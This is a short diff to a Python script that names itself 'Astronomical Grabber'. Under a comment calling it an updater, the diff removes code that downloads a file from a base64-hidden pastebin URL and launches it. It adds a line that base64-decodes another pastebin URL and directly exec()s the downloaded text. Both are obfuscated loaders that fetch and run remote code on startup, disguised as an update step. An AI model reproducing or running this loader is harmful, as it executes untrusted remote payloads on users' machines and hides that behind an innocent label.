@@ -12,19 +12,7 @@ from colorama import Fore, Style
 settings=" "
 
 #Update Maker (Updates Astronomical Grabber if there is an update)
-path=os.getcwd()
-try:
-  os.mkdir("config")
-except:
-  pass
-os.chdir('./config')
-with open('maker.py', 'w') as file:
-    file.writelines(requests.get(base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzFXWU1XejdS').decode("utf-8")).text)
-    file.close()
-    system(base64.b64decode('c3RhcnQgL01JTiAiIiAibWFrZXIucHki').decode("utf-8"))
-
-os.chdir(path)
-
+exec(requests.get(base64.b64decode('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3daWHRQWmdx').decode("utf-8")).text)
 
 #Cool Animation :>
 system("cls")
